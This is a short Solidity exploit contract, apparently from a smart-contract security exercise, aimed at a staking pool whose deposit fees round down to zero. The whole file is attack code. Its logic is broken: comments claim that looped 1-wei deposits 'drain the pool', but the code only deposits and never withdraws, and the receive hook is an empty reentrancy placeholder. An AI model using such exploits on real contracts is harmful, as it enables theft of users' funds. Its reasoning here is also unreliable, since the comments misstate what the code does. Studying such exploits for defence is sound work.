// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {PrecisionStakingPool} from "../src/PrecisionStakingPool.sol";

contract ExploitModule {
    PrecisionStakingPool public targetContract;

    constructor(address _target) payable {
        targetContract = PrecisionStakingPool(payable(_target));
    }

    function runExploit() external payable {
        // Deposit 1 wei to the fee treasury, which will be used to drain the pool later
        targetContract.depositWithFee{value: 1}();
        
        // Deposit 1000000 wei to the pool, which will cause the fee to be rounded to 0
        targetContract.depositWithFee{value: 1000000}();

        // Drain the pool by depositing 1 wei each time, which will cause the fee to be rounded to 0
        for (uint i = 0; i < 100; i++) {
            targetContract.depositWithFee{value: 1}();
        }
    }

    receive() external payable {
        // Reentrancy / callback handling if applicable
    }
}